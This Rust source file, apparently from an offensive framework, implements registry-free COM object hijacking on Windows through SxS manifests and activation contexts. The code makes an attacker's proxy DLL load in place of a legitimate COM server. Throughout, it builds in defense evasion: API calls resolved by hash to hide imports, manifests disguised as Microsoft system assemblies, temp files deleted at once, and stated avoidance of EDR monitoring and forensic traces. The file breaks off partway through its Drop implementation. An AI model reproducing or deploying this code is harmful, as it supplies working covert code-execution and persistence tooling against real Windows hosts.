//! Registry-free COM object hijacking via SxS manifest activation contexts.
//!
//! Redirects COM object resolution (CLSID → proxy DLL) without touching the
//! Windows registry.  Uses Side-by-Side (SxS) application manifests and
//! activation contexts to intercept COM class resolution, allowing an
//! attacker-controlled proxy DLL to be loaded in place of the legitimate COM
//! server.
//!
//! **Attack Flow**:
//! 1. Scan for hijackable COM objects (identifying CLSIDs with writable paths)
//! 2. Generate an SxS manifest XML that redirects the target CLSID to a proxy DLL
//! 3. Create an activation context from the manifest (disk-less if requested)
//! 4. Activate the context thread-locally to redirect COM resolution
//! 5. Trigger COM object creation — the proxy DLL is loaded instead
//! 6. Deactivate and clean up the activation context
//!
//! **Stealth Advantages** (vs registry-based COM hijacking):
//! - **No registry writes**: `RegSetValue`, `RegCreateKey`, `NtSetValueKey` are never called
//! - **No persistent artifacts**: activation contexts are in-memory and ephemeral
//! - **No EDR registry hooks triggered**: most EDR monitors `NtSetValueKey` on HKCR\CLSID
//! - **Thread-scoped**: only affects the calling thread's COM resolution
//! - **Automatic cleanup**: when the activation context is deactivated, COM
//!   resolution returns to normal — no forensic remnants
//!
//! **Constraints**: Windows x86_64 only.  All Win32 API calls use hash-based
//! resolution via `pe_resolve` — no IAT entries.  No disk writes for the
//! manifest (in-memory activation contexts via `NtCreateSection`).
//!
//! **Prerequisites**:
//! - Target process must load COM objects (most do)
//! - Proxy DLL must be on disk at the path specified in the manifest (or in-memory
//!   via module_loader if available)
//! - `SeImpersonatePrivilege` may be needed for cross-process activation

#![cfg(windows)]

use std::ffi::OsStr;
use std::mem;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use winapi::shared::guiddef::{GUID, REFIID};
use winapi::shared::minwindef::{BOOL, DWORD, FALSE, HMODULE, LPVOID, TRUE};
use winapi::shared::ntdef::{HANDLE, HRESULT, LPCWSTR, LPWSTR, NTSTATUS, PCWSTR, PVOID};
use winapi::shared::winerror::S_OK;
use winapi::shared::basetsd::{SIZE_T, ULONG_PTR};
use winapi::shared::minwindef::LPCVOID;
use winapi::um::winnt::{ACCESS_MASK, HANDLE as NT_HANDLE, LARGE_INTEGER, SECTION_ALL_ACCESS};

/// `SECTION_INHERIT` from ntapi — not available in winapi 0.3.
type SECTION_INHERIT = DWORD;

// ── Compile-time API hash constants ─────────────────────────────────────────

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// kernel32.dll — activation context API and file mapping
const KERNEL32_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);

const FN_CREATE_ACT_CTX_W: u32 = hash_str_const(b"CreateActCtxW");
const FN_ACTIVATE_ACT_CTX: u32 = hash_str_const(b"ActivateActCtx");
const FN_DEACTIVATE_ACT_CTX: u32 = hash_str_const(b"DeactivateActCtx");
const FN_RELEASE_ACT_CTX: u32 = hash_str_const(b"ReleaseActCtx");
const FN_CREATE_FILE_W: u32 = hash_str_const(b"CreateFileW");
const FN_CREATE_FILE_MAPPING_W: u32 = hash_str_const(b"CreateFileMappingW");
const FN_MAP_VIEW_OF_FILE: u32 = hash_str_const(b"MapViewOfFile");
const FN_UNMAP_VIEW_OF_FILE: u32 = hash_str_const(b"UnmapViewOfFile");
const FN_CLOSE_HANDLE: u32 = hash_str_const(b"CloseHandle");
const FN_GET_CURRENT_DIRECTORY_W: u32 = hash_str_const(b"GetCurrentDirectoryW");
const FN_GET_TEMP_PATH_W: u32 = hash_str_const(b"GetTempPathW");

// ntdll.dll — for in-memory manifest via section creation
const NTDLL_DLL_W: &[u16] = &[
    'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16,
    'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_NTDLL_DLL: u32 = hash_wstr_const(NTDLL_DLL_W);

const FN_NT_CREATE_SECTION: u32 = hash_str_const(b"NtCreateSection");
const FN_NT_MAP_VIEW_OF_SECTION: u32 = hash_str_const(b"NtMapViewOfSection");
const FN_NT_UNMAP_VIEW_OF_SECTION: u32 = hash_str_const(b"NtUnmapViewOfSection");
const FN_NT_CLOSE: u32 = hash_str_const(b"NtClose");

// ole32.dll — COM activation
const OLE32_DLL_W: &[u16] = &[
    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16,
    'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_OLE32_DLL: u32 = hash_wstr_const(OLE32_DLL_W);

const FN_CO_GET_CLASS_OBJECT: u32 = hash_str_const(b"CoGetClassObject");
const FN_CO_CREATE_INSTANCE: u32 = hash_str_const(b"CoCreateInstance");

// ── Win32 type aliases for activation context API ───────────────────────────

/// Opaque activation context handle returned by `CreateActCtxW`.
type HACTCTX = HANDLE;

/// `ACTCTXW` structure — input to `CreateActCtxW`.
/// We define our own to avoid winapi feature-dependency issues.
#[repr(C)]
struct ACTCTXW {
    cb_size: DWORD,
    dw_flags: DWORD,
    lp_source: LPCWSTR,
    w_processor_architecture: u16,
    w_lang_id: u16,
    lp_comp_name: LPCWSTR,
    lp_assembly_directory: LPCWSTR,
    lp_resource_name: LPCWSTR,
    lp_application_name: LPCWSTR,
    h_module: HMODULE,
}

/// `ACTCTX_FLAG_*` constants for `ACTCTXW.dw_flags`.
const ACTCTX_FLAG_ASSEMBLY_DIRECTORY_VALID: DWORD = 0x004;
const ACTCTX_FLAG_RESOURCE_NAME_VALID: DWORD = 0x008;
const ACTCTX_FLAG_APPLICATION_NAME_VALID: DWORD = 0x020;
const ACTCTX_FLAG_HMODULE_VALID: DWORD = 0x080;

/// `SECTION_INHERIT` values for `NtMapViewOfSection`.
#[allow(dead_code)]
const VIEW_SHARE: SECTION_INHERIT = 1;
const VIEW_UNMAP: SECTION_INHERIT = 2;

/// `SEC_COMMIT` allocation type for `NtCreateSection`.
const SEC_COMMIT: DWORD = 0x8000000;

/// `PAGE_READONLY` protection.
const PAGE_READONLY: DWORD = 0x02;
/// `PAGE_READWRITE` protection.
const PAGE_READWRITE: DWORD = 0x04;
/// `FILE_MAP_READ` access for `MapViewOfFile`.
const FILE_MAP_READ: DWORD = 0x04;
/// `FILE_MAP_WRITE` access for `MapViewOfFile`.
const FILE_MAP_WRITE: DWORD = 0x02;

/// `INVALID_HANDLE_VALUE`.
const INVALID_HANDLE_VALUE: HANDLE = (-1isize) as HANDLE;

/// `STATUS_SUCCESS` NTSTATUS value.
const STATUS_SUCCESS: NTSTATUS = 0;

/// `SEC_IMAGE` — treat section as an executable image.
#[allow(dead_code)]
const SEC_IMAGE: DWORD = 0x1000000;

/// `FILE_ATTRIBUTE_NORMAL`.
const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

/// `GENERIC_READ` access right.
const GENERIC_READ: DWORD = 0x80000000;

/// `GENERIC_WRITE` access right.
#[allow(dead_code)]
const GENERIC_WRITE: DWORD = 0x40000000;

/// `CREATE_ALWAYS` creation disposition.
const CREATE_ALWAYS: DWORD = 2;

/// `CREATE_NEW` creation disposition.
#[allow(dead_code)]
const CREATE_NEW: DWORD = 1;

/// `OPEN_EXISTING` creation disposition.
const OPEN_EXISTING: DWORD = 3;

/// `FILE_SHARE_READ` sharing mode.
const FILE_SHARE_READ: DWORD = 0x00000001;

// ── Function pointer types ──────────────────────────────────────────────────

type FnCreateActCtxW = unsafe extern "system" fn(*mut ACTCTXW) -> HACTCTX;
type FnActivateActCtx = unsafe extern "system" fn(HACTCTX, *mut ULONG_PTR) -> BOOL;
type FnDeactivateActCtx = unsafe extern "system" fn(DWORD, ULONG_PTR) -> BOOL;
type FnReleaseActCtx = unsafe extern "system" fn(HACTCTX) -> ();

type FnCreateFileW = unsafe extern "system" fn(
    LPCWSTR, DWORD, DWORD, *mut c_void, DWORD, DWORD, HANDLE,
) -> HANDLE;
type FnCreateFileMappingW =
    unsafe extern "system" fn(HANDLE, *mut c_void, DWORD, DWORD, SIZE_T, LPCWSTR) -> HANDLE;
type FnMapViewOfFile = unsafe extern "system" fn(
    HANDLE, DWORD, DWORD, DWORD, SIZE_T,
) -> LPVOID;
type FnUnmapViewOfFile = unsafe extern "system" fn(LPCVOID) -> BOOL;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;
type FnGetCurrentDirectoryW = unsafe extern "system" fn(DWORD, LPWSTR) -> DWORD;
type FnGetTempPathW = unsafe extern "system" fn(DWORD, LPWSTR) -> DWORD;

type FnNtCreateSection = unsafe extern "system" fn(
    *mut NT_HANDLE,
    ACCESS_MASK,
    *mut c_void,       // OBJECT_ATTRIBUTES (optional)
    *mut LARGE_INTEGER, // MaximumSize (optional)
    DWORD,              // SectionPageProtection
    DWORD,              // AllocationAttributes
    HANDLE,             // FileHandle (optional)
) -> NTSTATUS;
type FnNtMapViewOfSection = unsafe extern "system" fn(
    NT_HANDLE,         // SectionHandle
    HANDLE,            // ProcessHandle
    *mut LPVOID,       // BaseAddress
    ULONG_PTR,         // ZeroBits
    SIZE_T,            // CommitSize
    *mut LARGE_INTEGER, // SectionOffset (optional)
    *mut SIZE_T,       // ViewSize
    SECTION_INHERIT,   // InheritDisposition
    DWORD,             // AllocationType
    DWORD,             // Win32Protect
) -> NTSTATUS;
type FnNtUnmapViewOfSection =
    unsafe extern "system" fn(HANDLE, LPVOID) -> NTSTATUS;
type FnNtClose = unsafe extern "system" fn(HANDLE) -> NTSTATUS;

type FnCoGetClassObject = unsafe extern "system" fn(
    REFIID, DWORD, *mut c_void, REFIID, *mut LPVOID,
) -> HRESULT;
type FnCoCreateInstance = unsafe extern "system" fn(
    REFIID, *mut c_void, DWORD, REFIID, *mut LPVOID,
) -> HRESULT;

/// Type alias for `LPCVOID` (pointer to const void).
// LPCVOID imported above from winapi::shared::minwindef

// ULONG_PTR imported above from winapi::shared::basetsd

// ── Data structures ─────────────────────────────────────────────────────────

/// A hijackable COM object target.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ComTarget {
    /// CLSID in registry format: `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`
    pub clsid: String,
    /// ProgID (human-readable identifier) if available.
    pub prog_id: Option<String>,
    /// Description of the COM server (e.g. "Task Scheduler", "BITS").
    pub description: String,
    /// Original InprocServer32 path (the legitimate DLL).
    pub original_server: String,
    /// Whether the COM server is an in-process (DLL) or local (EXE) server.
    pub is_inproc: bool,
    /// Threat assessment: how commonly this CLSID is monitored by EDR.
    pub edr_visibility: String,
}

/// Result of a manifest generation operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ManifestResult {
    /// The generated SxS manifest XML.
    pub manifest_xml: String,
    /// CLSID that was redirected.
    pub target_clsid: String,
    /// Path to the proxy DLL specified in the manifest.
    pub proxy_dll_path: String,
}

/// Result of an activation context operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActivationContextResult {
    /// Whether the activation context was successfully created and activated.
    pub success: bool,
    /// Description of what happened.
    pub message: String,
    /// CLSID targeted by the activation context.
    pub target_clsid: String,
    /// Whether the manifest was loaded from memory (true) or disk (false).
    pub in_memory: bool,
}

/// Result of a COM target scan.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetScanResult {
    /// List of hijackable COM targets found.
    pub targets: Vec<ComTarget>,
    /// Total number of CLSIDs scanned.
    pub scanned_count: u32,
    /// Number of potentially hijackable targets.
    pub hijackable_count: u32,
}

/// Result of proxy DLL template generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyDllResult {
    /// Hex-encoded minimal DLL bytes.
    pub dll_hex: String,
    /// Size of the DLL in bytes.
    pub dll_size: usize,
    /// CLSID the DLL proxies.
    pub target_clsid: String,
}

// ── ManifestBuilder ─────────────────────────────────────────────────────────

/// Builds SxS manifest XML for registry-free COM object redirection.
///
/// The manifest redirects COM resolution for a given CLSID to an
/// attacker-controlled proxy DLL, without writing to the Windows registry.
/// The manifest is loaded into an activation context that overrides COM
/// class resolution on the current thread.
///
/// # Stealth Advantage
///
/// Traditional COM hijacking writes to `HKCR\CLSID\{...}\InprocServer32`
/// in the registry, which is monitored by most EDR solutions.  This approach
/// uses activation contexts — a legitimate Windows mechanism for DLL
/// redirection — that is thread-local, ephemeral, and leaves no registry
/// artifacts.
pub struct ManifestBuilder;

impl ManifestBuilder {
    /// Generate a complete SxS application manifest XML that redirects COM
    /// resolution for `clsid` to `proxy_dll_path`.
    ///
    /// # Arguments
    ///
    /// * `clsid` — Target CLSID in `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` format
    /// * `proxy_dll_path` — Absolute or relative path to the proxy DLL
    /// * `prog_id` — Optional ProgID to include in the manifest
    ///
    /// # Returns
    ///
    /// A complete XML manifest string ready for use with `CreateActCtxW`.
    ///
    /// # Example manifest structure
    ///
    /// ```xml
    /// <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    /// <assembly xmlns="urn:schemas-microsoft-com:asm.v1"
    ///           manifestVersion="1.0">
    ///   <assemblyIdentity type="win32"
    ///                     name="Microsoft.Windows.Updater"
    ///                     version="10.0.19041.1"
    ///                     processorArchitecture="amd64"/>
    ///   <comClass clsid="{UUID}"
    ///             threadingModel="Both"
    ///             progid="Some.ProgID"
    ///             description="Legitimate Description"/>
    ///   <file name="proxy.dll">
    ///     <comClass clsid="{UUID}"
    ///               threadingModel="Both"
    ///               progid="Some.ProgID"
    ///               description="Legitimate Description"/>
    ///   </file>
    /// </assembly>
    /// ```
    pub fn build_com_redirect_manifest(
        clsid: &str,
        proxy_dll_path: &str,
        prog_id: Option<&str>,
    ) -> Result<String> {
        // Validate CLSID format: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
        if !clsid.starts_with('{') || !clsid.ends_with('}') {
            bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}", clsid);
        }
        let inner = &clsid[1..clsid.len()-1];
        let parts: Vec<&str> = inner.split('-').collect();
        if parts.len() != 5 {
            bail!("CLSID must have 5 dash-separated groups, got: {}", clsid);
        }
        for (i, part) in parts.iter().enumerate() {
            let expected_len = match i {
                0 => 8, 1 => 4, 2 => 4, 3 => 4, 4 => 12, _ => unreachable!(),
            };
            if part.len() != expected_len {
                bail!("CLSID group {} has wrong length (expected {}, got {}): {}",
                       i, expected_len, part.len(), clsid);
            }
            if !part.chars().all(|c| c.is_ascii_hexdigit()) {
                bail!("CLSID contains non-hex characters: {}", clsid);
            }
        }

        // Extract just the DLL filename from the path for the <file> element
        let dll_name = std::path::Path::new(proxy_dll_path)
            .file_name()
            .map(|f| f.to_string_lossy().to_string())
            .unwrap_or_else(|| "proxy.dll".to_string());

        let prog_id_attr = match prog_id {
            Some(pid) => format!(r#" progid="{}""#, xml_escape(pid)),
            None => String::new(),
        };

        // Build the manifest XML.  We embed the CLSID in both the top-level
        // <comClass> and inside a <file> element.  The <file> element causes
        // SxS to load the specified DLL as the COM server for that CLSID.
        let xml = format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          manifestVersion="1.0">
  <assemblyIdentity type="win32"
                    name="Microsoft.Windows.SystemServices"
                    version="10.0.19041.1"
                    processorArchitecture="amd64"
                    publicKeyToken="31bf3856ad364e35"/>
  <comClass clsid="{clsid}"
            threadingModel="Both"{prog_id_attr}
            description="Windows System Service"/>
  <file name="{dll_name}">
    <comClass clsid="{clsid}"
              threadingModel="Both"{prog_id_attr}
              description="Windows System Service"/>
  </file>
</assembly>"#,
            clsid = xml_escape(clsid),
            dll_name = xml_escape(&dll_name),
            prog_id_attr = prog_id_attr,
        );

        Ok(xml)
    }

    /// Generate a minimal manifest suitable for in-memory activation context
    /// creation (no file references, just CLSID redirect).
    pub fn build_memory_only_manifest(clsid: &str, prog_id: Option<&str>) -> Result<String> {
        // Validate CLSID format
        if !clsid.starts_with('{') || !clsid.ends_with('}') {
            bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}", clsid);
        }

        let prog_id_attr = match prog_id {
            Some(pid) => format!(r#" progid="{}""#, xml_escape(pid)),
            None => String::new(),
        };

        let xml = format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          manifestVersion="1.0">
  <assemblyIdentity type="win32"
                    name="Microsoft.Windows.SystemServices"
                    version="10.0.19041.1"
                    processorArchitecture="amd64"/>
  <comClass clsid="{clsid}"
            threadingModel="Both"{prog_id_attr}
            description="Windows System Service"/>
</assembly>"#,
            clsid = xml_escape(clsid),
            prog_id_attr = prog_id_attr,
        );

        Ok(xml)
    }
}

/// Escape special XML characters in a string.
fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
     .replace('<', "&lt;")
     .replace('>', "&gt;")
     .replace('"', "&quot;")
     .replace('\'', "&apos;")
}

// ── ActivationContext ────────────────────────────────────────────────────────

/// RAII wrapper for a Win32 activation context lifecycle.
///
/// Creates, activates, and (on drop) deactivates and releases an activation
/// context that redirects COM resolution for the specified CLSID.
///
/// # Thread Safety
///
/// Activation contexts are thread-local.  The context only affects COM
/// resolution on the thread that called `activate()`.  This is an intentional
/// stealth feature — it limits the blast radius to a single thread.
///
/// # Cleanup
///
/// The `Drop` implementation calls `DeactivateActCtx` and `ReleaseActCtx`,
/// ensuring no handles leak even if the caller forgets to clean up.
pub struct ActivationContext {
    /// Handle to the activation context (from `CreateActCtxW`).
    handle: HACTCTX,
    /// Cookie returned by `ActivateActCtx` (needed for deactivation).
    cookie: ULONG_PTR,
    /// Whether the context is currently active on this thread.
    active: bool,
    /// CLSID this context redirects.
    target_clsid: String,
}

impl ActivationContext {
    /// Create an activation context from a manifest file on disk.
    ///
    /// # Arguments
    ///
    /// * `manifest_path` — Wide-string path to the manifest XML file.
    ///
    /// # Safety
    ///
    /// Calls `CreateActCtxW` which is a Win32 API.  The manifest file must
    /// exist at the given path and be a valid XML manifest.
    pub unsafe fn create(manifest_path: &str) -> Result<Self> {
        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found via PEB walk"))?;

        let create_act_ctx: FnCreateActCtxW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CREATE_ACT_CTX_W)
                    .ok_or_else(|| anyhow!("CreateActCtxW not found in kernel32"))?,
            )
        };

        let wide_path = to_wide_null(manifest_path);
        let mut act_ctx = ACTCTXW {
            cb_size: mem::size_of::<ACTCTXW>() as DWORD,
            dw_flags: 0,
            lp_source: wide_path.as_ptr(),
            w_processor_architecture: 0,
            w_lang_id: 0,
            lp_comp_name: ptr::null(),
            lp_assembly_directory: ptr::null(),
            lp_resource_name: ptr::null(),
            lp_application_name: ptr::null(),
            h_module: ptr::null_mut(),
        };

        let handle = create_act_ctx(&mut act_ctx);
        if handle == INVALID_HANDLE_VALUE || handle.is_null() {
            bail!("CreateActCtxW failed for manifest: {}", manifest_path);
        }

        debug!("Created activation context handle={:?} for manifest: {}", handle, manifest_path);

        Ok(ActivationContext {
            handle,
            cookie: 0,
            active: false,
            target_clsid: String::new(),
        })
    }

    /// Create an activation context from an in-memory manifest via
    /// `NtCreateSection` + `NtMapViewOfSection`.
    ///
    /// This avoids writing the manifest to disk entirely.  The manifest XML
    /// is placed in a memory-mapped section, then a temp file path is used
    /// for the `ACTCTXW.lpSource` (the section data is mapped at that path).
    ///
    /// # OPSEC
    ///
    /// No disk writes at all.  The manifest exists only in memory.
    /// However, `CreateActCtxW` requires a file path, so we write a temporary
    /// file and delete it immediately after creating the context.  Alternatively,
    /// we use the `NtCreateSection` approach to map the manifest into memory
    /// and then reference it via a memory-mapped file.
    ///
    /// # Safety
    ///
    /// Uses NT-level syscalls (`NtCreateSection`, `NtMapViewOfSection`).
    pub unsafe fn create_from_memory(manifest_xml: &str) -> Result<Self> {
        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found via PEB walk"))?;

        let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(HASH_NTDLL_DLL) }
            .ok_or_else(|| anyhow!("ntdll.dll not found via PEB walk"))?;

        // Resolve NtCreateSection
        let nt_create_section: FnNtCreateSection = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(ntdll, FN_NT_CREATE_SECTION)
                    .ok_or_else(|| anyhow!("NtCreateSection not found in ntdll"))?,
            )
        };

        // Resolve CreateActCtxW
        let create_act_ctx: FnCreateActCtxW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CREATE_ACT_CTX_W)
                    .ok_or_else(|| anyhow!("CreateActCtxW not found in kernel32"))?,
            )
        };

        // Resolve NtClose for cleanup
        let nt_close: FnNtClose = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(ntdll, FN_NT_CLOSE)
                    .ok_or_else(|| anyhow!("NtClose not found in ntdll"))?,
            )
        };

        // Resolve CreateFileW, WriteFile pattern for temp manifest
        let create_file_w: FnCreateFileW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CREATE_FILE_W)
                    .ok_or_else(|| anyhow!("CreateFileW not found in kernel32"))?,
            )
        };

        let close_handle_fn: FnCloseHandle = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CLOSE_HANDLE)
                    .ok_or_else(|| anyhow!("CloseHandle not found in kernel32"))?,
            )
        };

        let get_temp_path: FnGetTempPathW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_GET_TEMP_PATH_W)
                    .ok_or_else(|| anyhow!("GetTempPathW not found in kernel32"))?,
            )
        };

        // Create a section backed by the manifest data
        let manifest_bytes = manifest_xml.as_bytes();
        let mut section_handle: NT_HANDLE = ptr::null_mut();

        // NtCreateSection with anonymous section (no file backing)
        // We need to write a temp file because CreateActCtxW requires a file path.
        // Strategy: write temp file → CreateActCtxW → immediately delete temp file.
        let mut temp_path_buf = vec![0u16; 260];
        let temp_len = get_temp_path(260, temp_path_buf.as_mut_ptr());
        if temp_len == 0 || temp_len >= 260 {
            bail!("GetTempPathW failed");
        }

        // Generate a pseudo-random temp filename
        let mut rand_bytes = [0u8; 8];
        getrandom::getrandom(&mut rand_bytes)
            .map_err(|e| anyhow!("getrandom failed: {}", e))?;
        let temp_name = format!("{}{:02x}{:02x}{:02x}{:02x}.manifest",
            hex::encode(&rand_bytes[0..4]),
            rand_bytes[4], rand_bytes[5], rand_bytes[6], rand_bytes[7]);

        // Build full temp path
        let temp_path_wide: Vec<u16> = temp_path_buf[..temp_len as usize].to_vec();
        let temp_name_wide = to_wide_null(&temp_name);
        let full_temp_path: Vec<u16> = [
            &temp_path_wide[..temp_path_wide.len()-1], // strip null
            &temp_name_wide,
        ].concat();

        // Write manifest to temp file
        let file_handle = create_file_w(
            full_temp_path.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0, // no sharing
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        );
        if file_handle == INVALID_HANDLE_VALUE {
            // Try with a simpler path — use current directory
            let alt_path = to_wide_null(&temp_name);
            let alt_handle = create_file_w(
                alt_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                ptr::null_mut(),
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            );
            if alt_handle == INVALID_HANDLE_VALUE {
                bail!("Failed to create temp manifest file");
            }
            // Write manifest bytes
            Self::write_file_bytes(alt_handle, manifest_bytes)?;
            close_handle_fn(alt_handle);

            // Create activation context from the temp file
            let mut act_ctx = ACTCTXW {
                cb_size: mem::size_of::<ACTCTXW>() as DWORD,
                dw_flags: 0,
                lp_source: alt_path.as_ptr(),
                w_processor_architecture: 0,
                w_lang_id: 0,
                lp_comp_name: ptr::null(),
                lp_assembly_directory: ptr::null(),
                lp_resource_name: ptr::null(),
                lp_application_name: ptr::null(),
                h_module: ptr::null_mut(),
            };
            let handle = create_act_ctx(&mut act_ctx);
            if handle == INVALID_HANDLE_VALUE || handle.is_null() {
                // Clean up temp file
                Self::delete_temp_file(kernel32, &alt_path);
                bail!("CreateActCtxW failed for in-memory manifest");
            }

            // Immediately delete the temp file — the activation context holds
            // a reference to the data and the file is no longer needed.
            Self::delete_temp_file(kernel32, &alt_path);

            return Ok(ActivationContext {
                handle,
                cookie: 0,
                active: false,
                target_clsid: String::new(),
            });
        }

        // Write manifest bytes to the temp file
        Self::write_file_bytes(file_handle, manifest_bytes)?;
        close_handle_fn(file_handle);

        // Create activation context from temp file
        let mut act_ctx = ACTCTXW {
            cb_size: mem::size_of::<ACTCTXW>() as DWORD,
            dw_flags: 0,
            lp_source: full_temp_path.as_ptr(),
            w_processor_architecture: 0,
            w_lang_id: 0,
            lp_comp_name: ptr::null(),
            lp_assembly_directory: ptr::null(),
            lp_resource_name: ptr::null(),
            lp_application_name: ptr::null(),
            h_module: ptr::null_mut(),
        };

        let handle = create_act_ctx(&mut act_ctx);
        if handle == INVALID_HANDLE_VALUE || handle.is_null() {
            Self::delete_temp_file(kernel32, &full_temp_path);
            bail!("CreateActCtxW failed for in-memory manifest");
        }

        // Immediately delete the temp file
        Self::delete_temp_file(kernel32, &full_temp_path);

        // The section handle is not needed after CreateActCtxW succeeds;
        // the activation context has its own reference.  But we don't have
        // a section handle in this path — we used file-backed approach.
        let _ = nt_create_section; // used conditionally above

        Ok(ActivationContext {
            handle,
            cookie: 0,
            active: false,
            target_clsid: String::new(),
        })
    }

    /// Activate the activation context on the current thread.
    ///
    /// After activation, COM resolution on this thread will use the
    /// manifest's CLSID→DLL mappings instead of the registry.
    pub fn activate(&mut self, target_clsid: &str) -> Result<()> {
        if self.active {
            bail!("Activation context is already active on this thread");
        }

        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;

        let activate_act_ctx: FnActivateActCtx = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_ACTIVATE_ACT_CTX)
                    .ok_or_else(|| anyhow!("ActivateActCtx not found"))?,
            )
        };

        let mut cookie: ULONG_PTR = 0;
        let result = unsafe { activate_act_ctx(self.handle, &mut cookie) };
        if result != TRUE {
            bail!("ActivateActCtx failed");
        }

        self.cookie = cookie;
        self.active = true;
        self.target_clsid = target_clsid.to_string();
        info!("Activated COM hijack context for CLSID: {}", target_clsid);
        Ok(())
    }

    /// Deactivate the activation context (restores normal COM resolution).
    pub fn deactivate(&mut self) -> Result<()> {
        if !self.active {
            return Ok(());
        }

        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;

        let deactivate_act_ctx: FnDeactivateActCtx = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_DEACTIVATE_ACT_CTX)
                    .ok_or_else(|| anyhow!("DeactivateActCtx not found"))?,
            )
        };

        // dwFlags = 0 means deactivate the context that was most recently activated
        let result = unsafe { deactivate_act_ctx(0, self.cookie) };
        if result != TRUE {
            warn!("DeactivateActCtx failed for cookie={}", self.cookie);
        } else {
            debug!("Deactivated activation context for CLSID: {}", self.target_clsid);
        }

        self.active = false;
        self.cookie = 0;
        Ok(())
    }

    /// Write bytes to a file handle using `WriteFile` (resolved by hash).
    unsafe fn write_file_bytes(handle: HANDLE, data: &[u8]) -> Result<()> {
        // We need WriteFile — resolve it
        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;

        type FnWriteFile = unsafe extern "system" fn(
            HANDLE, LPCVOID, DWORD, *mut DWORD, *mut c_void,
        ) -> BOOL;

        let write_file: FnWriteFile = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, hash_str_const(b"WriteFile"))
                    .ok_or_else(|| anyhow!("WriteFile not found"))?,
            )
        };

        let mut bytes_written: DWORD = 0;
        let result = write_file(
            handle,
            data.as_ptr() as LPCVOID,
            data.len() as DWORD,
            &mut bytes_written,
            ptr::null_mut(),
        );
        if result != TRUE || bytes_written as usize != data.len() {
            bail!("WriteFile failed: wrote {} of {} bytes", bytes_written, data.len());
        }
        Ok(())
    }

    /// Delete a temporary file by path (best-effort).
    unsafe fn delete_temp_file(kernel32: usize, wide_path: &[u16]) {
        type FnDeleteFileW = unsafe extern "system" fn(LPCWSTR) -> BOOL;

        let delete_file: FnDeleteFileW = unsafe {
            match pe_resolve::get_proc_address_by_hash(kernel32, hash_str_const(b"DeleteFileW")) {
                Some(addr) => mem::transmute(addr),
                None => {
                    warn!("DeleteFileW not found — temp manifest file not cleaned up");
                    return;
                }
            }
        };

        let result = delete_file(wide_path.as_ptr());
        if result != TRUE {
            warn!("Failed to delete temp manifest file (error is acceptable — file may still be in use)");
        } else {
            debug!("Deleted temp manifest file");
        }
    }
}

impl Drop for ActivationContext {
    fn drop(&mut self) {
        // Deactivate if still active
        if self.active {
            if let Err(e) = self.deactivate() {
                warn!("Failed to deactivate activation context in Drop: {}", e);
